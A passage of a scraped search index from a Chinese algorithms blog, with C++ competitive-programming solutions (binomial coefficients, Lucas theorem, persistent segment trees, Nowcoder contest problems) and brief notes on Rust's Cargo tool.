-i) sum += tr[i]; return sum; } ll query(ll l, ll r){ return query(r) - query(l - 1); } }tr; void solve(){ ll n, x; cin \u003e\u003e n \u003e\u003e x; vector\u003cll\u003e l(n + 1), r(n + 1), y(n + 1,0); set\u003cll\u003e it; vector\u003cpair\u003cll,ll\u003e\u003e f; for(ll i = 1; i \u003c= n; i++){ cin \u003e\u003e l[i] \u003e\u003e r[i] \u003e\u003e y[i]; it.insert(r[i] - 1); f.push_back({l[i], i}); } sort(f.begin(), f.end(), [\u0026](pair\u003cll,ll\u003e a, pair\u003cll,ll\u003e b){ return a.first \u003c b.first; }); //双指针枚举，一个枚举选择的计算点（右边界从小到大排序），一个枚举区间计算有交集的区域（左边界从小到大排序） //保证每个区间只枚举到一次 vector\u003cll\u003e tmp = y; map\u003cll,ll\u003e mp; ll cnt = 0; sort(tmp.begin(), tmp.end()); tmp.erase(unique(tmp.begin(),tmp.end()), tmp.end()); priority_queue\u003cpair\u003cll,ll\u003e,vector\u003cpair\u003cll,ll\u003e\u003e, greater\u003c\u003e\u003e que; for(auto i : tmp) mp[i] = cnt++; tr.resize(cnt + 5); ll ans = x; ll pos = 0; for(auto i : it){ while(pos \u003c n \u0026\u0026 f[pos].first \u003c= i){ que.push({r[f[pos].second], f[pos].second}); tr.update(mp[y[f[pos].second]], y[f[pos].second]); pos++; } while(!que.empty() \u0026\u0026 que.top().first \u003c= i){ auto [dr, id] = que.top(); que.pop(); tr.update(mp[y[id]], -y[id]); } //que中存和当前枚举点有交集的区间 //数状数组存离散后的贡献 ll num = 0, last = x; while(num != last){ num = last; ll pos = lower_bound(tmp.begin(), tmp.end(), last) - tmp.begin(); if(tmp[pos] \u003e last) last = x + tr.query(pos - 1); else last = x + tr.query(pos); } //计算可以获得的最大贡献 ans = max(ans, last); } cout \u003c\u003c ans \u003c\u003c '\\n'; } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }map到vector\rmap\u003cint,int\u003e mp; //or unordered_map vector\u003cpair\u003cint,int\u003e\u003e v(mp.begin(), vp.end());","date":"2024-07-26","objectID":"/posts/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:0:0","tags":["算法"],"title":"技巧总结","uri":"/posts/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/"},{"categories":["算法和数据结构"],"content":"组合数\r","date":"2024-07-26","objectID":"/posts/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:1:0","tags":["算法"],"title":"技巧总结","uri":"/posts/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/"},{"categories":["算法和数据结构"],"content":"范德蒙恒等式\r$$ \\sum {i=0}^{k} C_n^i*C_m^{k-i}=C{n+m}^k $$ c(a,b) 根据题目给的所求组合数的数目 n ，和a，b的范围来选择正确的方法求组合数 ","date":"2024-07-26","objectID":"/posts/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:1:1","tags":["算法"],"title":"技巧总结","uri":"/posts/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/"},{"categories":["算法和数据结构"],"content":"方法一（杨辉三角）\r885. 求组合数 I 数据范围 1≤n≤10000, 1≤b≤a≤2000。 mod = 1e9 + 7 由于发现a,b的范围非常小，是2000，，所以可以根据杨辉三角，预处理组合数，然后查表输出。题目是对1e9+7取模，由于是使用杨辉三角，都是加法，所以不会超出int范围。 时间复杂度 $O(2000 * 2000 + n)$ 所以不会tle 参考代码 #include \u003calgorithm\u003e\r#include \u003ciostream\u003e\rusing namespace std;\rconst int N = 2100 ,mod = 1e9 + 7 ;\rint c[N][N] ;\rvoid init(){\rfor(int i = 0 ; i \u003c N ; i++ ){\rfor(int j = 0 ; j \u003c= i ; j++){\rif(!j) c[i][j] = 1;\relse c[i][j] = (c[i-1][j] + c[i-1][j-1]) % mod; //根据杨辉三角，记得取mod\r}\r}\r}\rint main(){\rinit() ; //预处理组合数\rint t ;\rcin \u003e\u003e t ;\rwhile(t--){\rint a,b;\rcin \u003e\u003e a \u003e\u003e b ;\rcout \u003c\u003c c[a][b] \u003c\u003c endl; //查表输出\r}\rreturn 0 ;\r}","date":"2024-07-26","objectID":"/posts/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:1:2","tags":["算法"],"title":"技巧总结","uri":"/posts/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/"},{"categories":["算法和数据结构"],"content":"方法二(逆元)\r886. 求组合数 II 数据范围 1≤n≤10000, 1≤b≤a≤105 mod = 1e9 + 7 我门发现a和b的范围扩大到了1e5，所以不能使用杨辉三角(会t，空间也不允许),，然而发现题目中要求模为一个素数， 那么就可以使用费马小定理快速求得逆元，，所以可以根据组合数定义，求逆元来解决。 费马小定理 如果p是一个质数，而整数a不是p的倍数，则有$a^{(p-1)}$ ≡ 1 (mod p) 那么 转化一下 ， a * $a^{p-2}$ ≡ 1 (mod p) 那么$a^{p-2}$ 就是a(mod p)的逆元 组合数 c(a,b) = (a!)/(b! * (a - b)!) 可以先预处理出所有阶乘，和阶乘的逆元 时间复杂度 ：预处理阶乘逆元是 5000 * log(p-2) ,所以最后时间复杂度为$O(n + 5000 * log(p - 2)$ 参考代码 #include \u003calgorithm\u003e\r#include \u003ccstring\u003e\r#include \u003ccstdio\u003e\r#include \u003ciostream\u003e\rusing namespace std;\rtypedef long long ll ;\rconst int N = 1e5 + 100 , mod = 1e9 + 7 ;\rint n ;\rint a,b;\rint fact[N],infact[N] ; //fact存阶乘 ，infact存阶乘的逆元\rint qmi(int a,int n,int mod){ //快速幂 求得 a^n % mod int res = 1 ;\rwhile(n){\rif(n \u0026 1) res = (ll)res * a % mod ;\ra = (ll)a * a % mod ;\rn \u003e\u003e= 1 ;\r}\rreturn res ;\r}\rint main(){\rfact[0] = infact[0] = 1;\rfor(int i = 1 ; i \u003c N ; i++){\rfact[i] = (ll)fact[i-1] * i % mod ; //预处理前5000的阶乘和逆元\rinfact[i] = (ll)infact[i-1] * qmi(i,mod - 2,mod) % mod ; }\rscanf(\"%d\",\u0026n) ;\rwhile(n--){\rscanf(\"%d%d\",\u0026a,\u0026b) ;\rprintf(\"%d\\n\",(ll)fact[a] * infact[b] % mod * infact[a - b] % mod ) ; //组合数定义\r}\rreturn 0;\r}","date":"2024-07-26","objectID":"/posts/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:1:3","tags":["算法"],"title":"技巧总结","uri":"/posts/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/"},{"categories":["算法和数据结构"],"content":"方法三(卢卡斯定理)\r887. 求组合数 III 数据范围 1≤n≤20, 1≤b≤a≤1018, 1≤p≤105,且p均为素数 发现，题目给的a，b很大，肯定不能预处理，所以只能直接求，直接按照定义是线性的1e18也是不行的，发现结果需要%p，p很小，所以可以使用卢卡斯定理，将求的组合数转化为（a，b）小于p组合数。 lucas定理， 递归表示为 lucas(a,b) = lucas(a/p,b/p) * C(a%p,b%p) ,如果a\u003cp \u0026\u0026 b \u003c p 那么直接返回 C(a,b) ; 证明自行跳转到 y总提高课视频 时间复杂度：lucas定理最多递归log(a)次，然后求一次(a和b都会小于p)组合数使用逆元来求是 1e5 * log(1e5) ,最后再乘n ，$O(n * 1e5 * log(le5) * log(a))$ ,其实当p很大时，lucas的log底数很大，所以不会超时 参考代码 #include \u003calgorithm\u003e\r#include \u003ccstring\u003e\r#include \u003ccstdio\u003e\r#include \u003ciostream\u003e\rusing namespace std;\rtypedef long long ll ;\rconst int N = 1e5 + 100 ;\rll n ;\rll a,b,p ;\rll qmi(ll a ,ll n){ //快速幂\rll res = 1;\rwhile(n){\rif(n \u0026 1) res = res * a % p ;\ra = a * a % p ;\rn \u003e\u003e= 1 ;\r}\rreturn res ;\r}\rll C(ll a,ll b){ //使用组合数定义，结合逆元（因为p是素数）求得组合数\rll res = 1;\rfor(int i = a ,j = 1; j \u003c= b ; i-- , j++){\rres = res * i % p ;\rres = res * qmi(j,p-2) % p ;\r}\rreturn res;\r}\rll lucas(ll a,ll b){ // lucas定理递归处理\rif(a \u003c p \u0026\u0026 b \u003c p) return C(a,b) ;\rreturn lucas(a/p,b/p) * C(a%p,b%p) % p ;\r}\rint main(){\rcin \u003e\u003e n ;\rwhile(n--){\rcin \u003e\u003e a \u003e\u003e b \u003e\u003e p ;\rcout \u003c\u003c lucas(a,b) \u003c\u003c endl ;\r}\rreturn 0;\r}附 ：如果给的p不是素数，可以将组合数分解质因数，然后求得组合数（分解方法可以参考下面的高精度） ","date":"2024-07-26","objectID":"/posts/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:1:4","tags":["算法"],"title":"技巧总结","uri":"/posts/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/"},{"categories":["算法和数据结构"],"content":"方法四(分解质因数)\r888. 求组合数 IV 数据范围 1≤b≤a≤5000 (无取模，需要高精度) 没什么好说的，根据组合数的定义，分解出所有的质因数 参考代码 #include \u003calgorithm\u003e\r#include \u003ccstring\u003e\r#include \u003ccstdio\u003e\r#include \u003ciostream\u003e\rusing namespace std;\rconst int N = 5100 ;\rint a,b;\rint r[N] ;\rint primes[N],cnt;\rbool st[N] ;\rvoid init(int n){ //线性筛筛出素数\rfor(int i = 2; i \u003c= n ; i++){\rif(!st[i]) primes[cnt++] = i ;\rfor(int j = 0 ; primes[j] * i \u003c= n ; j++){\rst[primes[j] * i] = 1 ;\rif(i % primes[j] == 0) break ;\r}\r}\r}\rint get(int a,int p){ //获得从1到a中p因子的次方数，就是最多能能分解出多少p\rint cnt = 0 ;\rfor(int i = a ; i ; i /= p) cnt += i / p ;\rreturn cnt ;\r}\rvoid mul(int r[],int \u0026len,int x){ //高精度数组乘以一个数(非高精度),同时更新高精度数组长度\rint t = 0 ;\rfor(int i = 0 ; i \u003c len ; i ++){\rt += r[i] * x ;\rr[i] = t % 10 ;\rt /= 10 ;\r}\rwhile(t){\rr[len++] = t % 10 ;\rt /= 10 ;\r}\r}\rint C(int a,int b,int r[]){ int len = 1;\rr[0] = 1 ;\rfor(int i = 0 ; i \u003c cnt; i++){ //枚举所有的素数（小于a）\rint p = primes[i] ;\rint s = get(a,p) - get(b,p) - get(a - b ,p) ; //根据定义C（a,b） = (a!) / (b ! (a - b )! ) while(s--){ //如果不是高精度可以使用快速幂\rmul(r,len,p) ; //高精度就一个一个乘\r}\r}\rreturn len ;\r}\rint main(){\rinit(N-1) ;\rcin \u003e\u003e a \u003e\u003e b ;\rint len = C(a,b,r) ;\rint k = len - 1 ;\rwhile(!r[k] \u0026\u0026 k \u003e 0) k-- ; //输出高精度的结果\rwhile(k \u003e= 0) cout \u003c\u003c r[k--] ; cout \u003c\u003c endl ;\rreturn 0;\r}","date":"2024-07-26","objectID":"/posts/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:1:5","tags":["算法"],"title":"技巧总结","uri":"/posts/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/"},{"categories":["算法和数据结构"],"content":"解决问题： 可差性问题 需要版本更新的题（可持久化） ","date":"2024-07-26","objectID":"/posts/%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E7%BA%BF%E6%AE%B5%E6%A0%91/:0:0","tags":["算法"],"title":"可持久化线段树","uri":"/posts/%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E7%BA%BF%E6%AE%B5%E6%A0%91/"},{"categories":["算法和数据结构"],"content":"权值树上二分 第K大问题\r#include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; const ll mod = 1e9 + 7; ll ksm(ll a, ll b){ ll ret = 1; while(b){ if(b \u0026 1) ret = ret * a % mod; a = a * a % mod; b \u003e\u003e= 1; } return ret; } ll inv(ll x){ return ksm(x, mod - 2); } const int N = 100010; struct node{ int left, right; int cnt; }node[N * 20]; int root[1000010]; int cnt = 0; inline auto add(int pre, int \u0026curr, int l, int r, int val){ node[curr = ++cnt] = node[pre]; node[curr].cnt++; if(l == r) return; const int mid = (l + r) \u003e\u003e 1; if(val \u003c= mid) add(node[pre].left, node[curr].left, l, mid, val); else add(node[pre].right, node[curr].right, mid + 1, r, val); } inline auto query(int pre, int curr, int l, int r, int k) -\u003e int{ if(l == r) return l; int mid = (l + r) \u003e\u003e 1; int have = node[node[curr].left].cnt - node[node[pre].left].cnt; if(k \u003c= have) return query(node[pre].left, node[curr].left, l, mid, k); return query(node[pre].right, node[curr].right, mid + 1, r, k - have); } void solve(){ int n, m; cin \u003e\u003e n \u003e\u003e m; cnt = 0; vector\u003cint\u003e a(n + 1); memset(node, 0, sizeof node); memset(root, 0, sizeof root); for(int i = 1; i \u003c= n; i++){ cin \u003e\u003e a[i]; add(root[i - 1], root[i], 1, n, a[i]); } int lv = 1, rv = n; while(m--){ int l, r, k; cin \u003e\u003e l \u003e\u003e r \u003e\u003e k; if(k == r - l + 1){ lv = max(lv,query(root[l - 1], root[r], 1, n, k)); }else if (k == 0){ rv = min(rv,query(root[l - 1], root[r], 1, n, 1) - 1); }else{ lv = max(lv,query(root[l - 1], root[r], 1, n, k)); rv = min(rv,query(root[l - 1], root[r], 1, n, k + 1) - 1); } } if(lv == rv){ cout \u003c\u003c 1 \u003c\u003c ' ' \u003c\u003c lv \u003c\u003c '\\n'; }else{ cout \u003c\u003c inv(rv - lv + 1) \u003c\u003c '\\n'; } } int main(){ int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-07-26","objectID":"/posts/%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E7%BA%BF%E6%AE%B5%E6%A0%91/:1:0","tags":["算法"],"title":"可持久化线段树","uri":"/posts/%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E7%BA%BF%E6%AE%B5%E6%A0%91/"},{"categories":["Rust"],"content":"Cargo\r","date":"2024-07-15","objectID":"/posts/rust/rust01cargo/:1:0","tags":["语言"],"title":"Rust01——Cargo","uri":"/posts/rust/rust01cargo/"},{"categories":["Rust"],"content":"使用Cargo创建项目\r使用命令cargo new [项目名]创建项目 ","date":"2024-07-15","objectID":"/posts/rust/rust01cargo/:1:1","tags":["语言"],"title":"Rust01——Cargo","uri":"/posts/rust/rust01cargo/"},{"categories":["Rust"],"content":"使用Cargo编译/运行项目\r两种方式： cargo run 默认是debug模式，可以添加参数–release增强代码性能 cargo build后./target/debug/项目名，同样可以添加参数–release 使用cargo check可以快速检查代码有没有编译错误 ","date":"2024-07-15","objectID":"/posts/rust/rust01cargo/:1:2","tags":["语言"],"title":"Rust01——Cargo","uri":"/posts/rust/rust01cargo/"},{"categories":["Rust"],"content":"项目配置、依赖管理\rCargo.toml 和 Cargo.lock 是 cargo 的核心文件，它的所有活动均基于此二者。 Cargo.toml 是 cargo 特有的项目数据描述文件。它存储了项目的所有元配置信息。 package 中记录了项目的描述信息 [package]\rname = \"world_hello\" //项目名\rversion = \"0.1.0\" //当前版本\redition = \"2021\" //Rust大版本 dependencies则是管理项目依赖项 [dependencies] //三种依赖写法\rrand = \"0.3\"\rhammer = { version = \"0.5.0\"} //基于 Rust 官方仓库 crates.io，通过版本说明来描述\rcolor = { git = \"https://github.com/bjz/color-rs\" } //基于项目源代码的 git 仓库地址，通过 URL 来描述\rgeometry = { path = \"crates/geometry\" } //基于本地项目的绝对路径或者相对路径，通过类 Unix 模式的路径来描述 Cargo.lock 文件是 cargo 工具根据同一项目的 toml 文件生成的项目依赖详细清单。 ","date":"2024-07-15","objectID":"/posts/rust/rust01cargo/:1:3","tags":["语言"],"title":"Rust01——Cargo","uri":"/posts/rust/rust01cargo/"},{"categories":["算法和数据结构"],"content":"A.小红的同余\r签到题 #include\u003cbits/stdc++.h\u003e using namespace std; int main(){ long long m; cin \u003e\u003e m; cout \u003c\u003c (m + 1) / 2; return 0; }","date":"2024-07-14","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-51/:1:0","tags":["算法"],"title":"牛客周赛Round51","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-51/"},{"categories":["算法和数据结构"],"content":"B.小红的三倍数\r字符串输入。3的倍数特点数位之和是3的倍数，把每一位全部加起来模3就行。 #include\u003cbits/stdc++.h\u003e using namespace std; int main(){ int n; cin \u003e\u003e n; int ans = 0; for(int i = 1; i \u003c= n; i++){ string s; cin \u003e\u003e s; for(auto j : s){ ans = (ans + j - '0') % 3; } } if(ans % 3 == 0) cout \u003c\u003c \"YES\"; else cout \u003c\u003c \"NO\"; return 0; }","date":"2024-07-14","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-51/:2:0","tags":["算法"],"title":"牛客周赛Round51","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-51/"},{"categories":["算法和数据结构"],"content":"C.小红充电\r小于t的时候直接快充。大于t的时候要么直接充，要么先玩到t再快充。注意输出精度 #include\u003cbits/stdc++.h\u003e using namespace std; int main(){ double x, y, t, a, b, c; cin \u003e\u003e x \u003e\u003e y \u003e\u003e t \u003e\u003e a \u003e\u003e b \u003e\u003e c; double ans = 0; if(x \u003c= t){ ans = (100.0 - x) / c; }else{ ans = (100.0 - x) / b; ans = min(ans,((x - t) / y) + ((100 - t) / c)); } printf(\"%.7lf\", ans); return 0; }","date":"2024-07-14","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-51/:3:0","tags":["算法"],"title":"牛客周赛Round51","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-51/"},{"categories":["算法和数据结构"],"content":"D.小红的 gcd\r注意b是int范围，字符串输入a，然后对b取模（第一步辗转相除），然后套gcd公式就行。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll gcd(ll a, ll b){ return b ? gcd(b, a % b):a; } int main(){ string a; cin \u003e\u003e a; ll b; cin \u003e\u003e b; ll to = 0; for(auto i : a){ to = (to * 10 + (i - '0')) % b; } cout \u003c\u003c gcd(b, to); return 0; }","date":"2024-07-14","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-51/:4:0","tags":["算法"],"title":"牛客周赛Round51","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-51/"},{"categories":["算法和数据结构"],"content":"E.小红走矩阵\r直接bfs #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll a[550][550]; ll st[550][550]; int dx[] = {-1, 1, 0 ,0}; int dy[] = {0, 0, -1, 1}; int main(){ int n; cin \u003e\u003e n; for(int i = 1; i \u003c= n; i++) for(int j = 1; j \u003c= n; j++){ cin \u003e\u003e a[i][j]; } st[1][1] = a[1][1]; queue\u003cpair\u003cint,int\u003e\u003e que; que.push({1, 1}); while(que.size()){ auto [x, y] = que.front(); que.pop(); for(int i = 0; i \u003c 4; i++){ int xx = x + dx[i], yy = y + dy[i]; if(xx \u003e= 1 \u0026\u0026 xx \u003c= n \u0026\u0026 yy \u003e= 1 \u0026\u0026 yy \u003c= n){ int val = max(st[x][y], a[xx][yy]); if(st[xx][yy] \u0026\u0026 st[xx][yy] \u003c= val){ continue; }else{ st[xx][yy] = val; que.push({xx, yy}); } } } } cout \u003c\u003c st[n][n]; return 0; } ","date":"2024-07-14","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-51/:5:0","tags":["算法"],"title":"牛客周赛Round51","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-51/"},{"categories":["算法和数据结构"],"content":"F.小红的数组\r假设没有绝对值，求连续子段和的极值可以使用线段树。而考虑绝对值的话，答案显然是连续子段和的最大或最小的绝对值较大者。 线段树求连续子段和的最大值（最小值把max改为min即可）。 需要维护的信息： 区间和 区间从左端点开始的最大/小连续子段和 区间从右端点开始的最大/小连续子段和 区间最大/小的连续子段和 更新信息（画图便于理解）： 区间和直接对左右区间求和 左：max/min(左区间的左，左区间+右区间的左) 右：max/min(右区间的右，右区间+左区间的右) 最：max/min(max/min(左区间的最，右区间的最), 左区间的右+右区间的左)；最值显然要么来自左区间，要么来自右区间，要么是合并之后产生的（即左的右+右的左） #include\u003cbits/stdc++.h\u003e typedef long long ll; using namespace std; const int M=500010; ll a[M]; struct node{ ll s,ls,rs,ms; node(){}; node(ll x){this-\u003es = x, this-\u003els = x, this-\u003ers = x, this-\u003ems = x;}; node(ll s, ll ls, ll rs, ll ms){this-\u003es = s, this-\u003els = ls, this-\u003ers = rs, this-\u003ems = ms;}; node operator +(const node\u0026 b){ return node(this-\u003es + b.s, max(this-\u003els, this-\u003es + b.ls), max(b.rs, this-\u003ers + b.s), max(max(this-\u003ems, b.ms),this-\u003ers + b.ls)); }; node operator -(const node\u0026 b){ return node(this-\u003es + b.s, min(this-\u003els, this-\u003es + b.ls), min(b.rs, this-\u003ers + b.s), min(min(this-\u003ems, b.ms),this-\u003ers + b.ls)); };//重载运算符便于信息合并编码 }tree[M\u003c\u003c2], tree2[M\u003c\u003c2]; void build(ll p, ll pl, ll pr) { if (pl == pr) { tree[p] = node(a[pl]); return; } ll mid=(pl+pr)\u003e\u003e1; build(p \u003c\u003c 1, pl, mid); build(p \u003c\u003c 1 | 1, mid + 1, pr); tree[p] = tree[p \u003c\u003c 1] + tree[p \u003c\u003c 1 | 1]; } void build2(ll p, ll pl, ll pr) { if (pl == pr) { tree2[p] = node(a[pl]); return; } ll mid=(pl+pr)\u003e\u003e1; build2(p \u003c\u003c 1, pl, mid); build2(p \u003c\u003c 1 | 1, mid + 1, pr); tree2[p] = tree2[p \u003c\u003c 1] - tree2[p \u003c\u003c 1 | 1]; } node askans(int x,int y, int p, int pl,int pr) { if (x \u003c= pl \u0026\u0026 pr \u003c= y) return tree[p]; //完全包含 int mid=(pr + pl)\u003e\u003e1; node f1,f2,T; T.s=0; if (y \u003c= mid) //全部都在左儿子 T = askans(x, y, p \u003c\u003c 1, pl, mid); if (x \u003e mid) //全部都在右儿子 T = askans(x, y, p \u003c\u003c 1 | 1, mid + 1, pr); if (x \u003c= mid \u0026\u0026 y \u003e mid) { //询问区间被拆成两部分 f1 = askans(x, y, p \u003c\u003c 1, pl, mid); f2 = askans(x, y, p \u003c\u003c 1 | 1, mid + 1, pr); T = f1 + f2; } return T; } node askans2(int x,int y, int p, int pl,int pr) { if (x \u003c= pl \u0026\u0026 pr \u003c= y) return tree2[p]; //完全包含 int mid = (pr + pl) \u003e\u003e 1; node f1,f2,T; T.s=0; if (y \u003c= mid) //全部都在左儿子 T = askans2(x, y, p \u003c\u003c 1, pl, mid); if (x \u003e mid) //全部都在右儿子 T = askans2(x, y, p \u003c\u003c 1 | 1, mid + 1, pr); if (x \u003c= mid\u0026\u0026y\u003emid) { //询问区间被拆成两部分 f1 = askans2(x, y, p \u003c\u003c 1, pl, mid); f2 = askans2(x, y, p \u003c\u003c 1 | 1, mid + 1, pr); T = f1 - f2; } return T; } int main() { ios::sync_with_stdio(false); cin.tie(0); ll n; cin \u003e\u003e n; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e a[i]; build(1, 1, n); build2(1, 1, n); ll q; cin \u003e\u003e q; while (q--) { ll l, r; cin \u003e\u003e l \u003e\u003e r; if(l \u003e r) swap(l, r); node ans = askans(l, r, 1, 1, n); node ans2 = askans2(l, r, 1, 1, n); cout \u003c\u003c max(ans.ms, abs(ans2.ms)) \u003c\u003c '\\n'; } return 0; }","date":"2024-07-14","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-51/:6:0","tags":["算法"],"title":"牛客周赛Round51","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-51/"},{"categories":["算法和数据结构"],"content":"A.骰子魔术\r签到题 #include\u003cbits/stdc++.h\u003e using namespace std; int main(){ int n, x; cin \u003e\u003e n \u003e\u003e x; int flag = 0; for(int i = 1; i \u003c= n; i++){ int t; cin \u003e\u003e t; if(t == x){ flag = 1; } } if(flag) cout \u003c\u003c \"YES\"; else cout \u003c\u003c \"NO\"; return 0; }","date":"2024-07-13","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B98/:1:0","tags":["算法"],"title":"牛客小白月赛98","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B98/"},{"categories":["算法和数据结构"],"content":"B.最少剩几个？\r规则1：奇偶相消 规则2：奇奇相消 先规则1，再规2 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll a[100010]; int main(){ ll n; cin \u003e\u003e n; int cnt0 = 0, cnt1 = 0; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e a[i]; for(int i = 1; i \u003c= n; i++) if(a[i] \u0026 1) cnt1++; else cnt0++; int p = min(cnt0, cnt1); cnt0 -= p, cnt1 -= p; cnt1 %= 2; cout \u003c\u003c cnt0 + cnt1; return 0; }","date":"2024-07-13","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B98/:2:0","tags":["算法"],"title":"牛客小白月赛98","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B98/"},{"categories":["算法和数据结构"],"content":"C.两个函数\r$x\u003e1时g(x)化简为\\sum_{i=1}^{x-1}a^2 i$再化简求和就行 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; const ll mod = 998244353; ll ksm(ll a, ll b){ ll res = 1; while(b){ if(b \u0026 1) res = res * a % mod; a = a * a % mod; b \u003e\u003e= 1; } return res; } int main(){ ios::sync_with_stdio(false); cin.tie(0); ll inv2 = ksm(2, mod - 2); int q; cin \u003e\u003e q; while(q--){ ll a, x; cin \u003e\u003e a \u003e\u003e x; if(x == 1) { cout \u003c\u003c a % mod \u003c\u003c '\\n'; }else{ ll ans = a * a % mod; ans = ans * x % mod; ans = ans * (x - 1) % mod; ans = ans * inv2 % mod; cout \u003c\u003c ans \u003c\u003c '\\n'; } } return 0; }","date":"2024-07-13","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B98/:3:0","tags":["算法"],"title":"牛客小白月赛98","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B98/"},{"categories":["算法和数据结构"],"content":"D.切割 01 串 2.0\rdfs+记忆化 记忆化不能用map会tle #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll cnt[2][550]; ll n, L, R; ll st[550][550]; ll dfs(ll l, ll r){ if(l == r){ return 0; } if(st[l][r]) return st[l][r]; ll res = 0, flag = 0; for(ll pos = l; pos \u003c r; pos++){ ll c0 = cnt[0][pos] - cnt[0][l - 1]; ll c1 = cnt[1][r] - cnt[1][pos]; ll tmp = 0; if(L \u003c= abs(c0 - c1) \u0026\u0026 abs(c0 - c1) \u003c= R){ flag = 1; tmp += dfs(l, pos); tmp += dfs(pos + 1, r); } res = max(res, tmp); } if(flag) res += 1; st[l][r] = res; return res; } int main(){ ios::sync_with_stdio(false); cin.tie(0); cin \u003e\u003e n \u003e\u003e L \u003e\u003e R; string s; cin \u003e\u003e s; s = '$' + s; for(ll i = 1; i \u003c= n; i++){ if(s[i] == '0'){ cnt[0][i] = cnt[0][i - 1] + 1; cnt[1][i] = cnt[1][i - 1]; }else{ cnt[0][i] = cnt[0][i - 1]; cnt[1][i] = cnt[1][i - 1] + 1; } } cout \u003c\u003c dfs(1, n); return 0; } ","date":"2024-07-13","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B98/:4:0","tags":["算法"],"title":"牛客小白月赛98","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B98/"},{"categories":["算法和数据结构"],"content":"E.and xor or\r题目求值只有当区间在某一位都是0/1时，这一位为0，当0、1同时存在时，这一位为1。 采用前缀和的思想，将求两个边界转为求一个边界，然后相减得结果。 solve(x)表示小于2^x的区间个数，而值小于2^x说明在第x位到最高位都是全0或全1的，使用枚举判断。 如果一个大区间小于2^x，显然小区间也小于。那么只要线性每次求最长的区间就行。 区间长度1、2、3、…、len枚举，易得总区间个数为len*（len+1）/2。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; const int N = 500010; ll a[N]; int main(){ ll n, k1, k2; cin \u003e\u003e n \u003e\u003e k1 \u003e\u003e k2; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e a[i]; auto solve = [\u0026](int x){ ll ans = 0, cnt = 0; for(int i = 1; i \u003c= n; i++){ bool ok = true; for(int j = x; j \u003c= 60; j++){ int u = a[i] \u003e\u003e j \u0026 1; int v = a[i - 1] \u003e\u003e j \u0026 1; if(u != v){ ok = false; break; } } if(ok) cnt++; else ans += cnt * (cnt + 1) / 2, cnt = 1; } ans += cnt * (cnt + 1) / 2; return ans; }; cout \u003c\u003c (solve(k2) - solve(k1)); return 0; 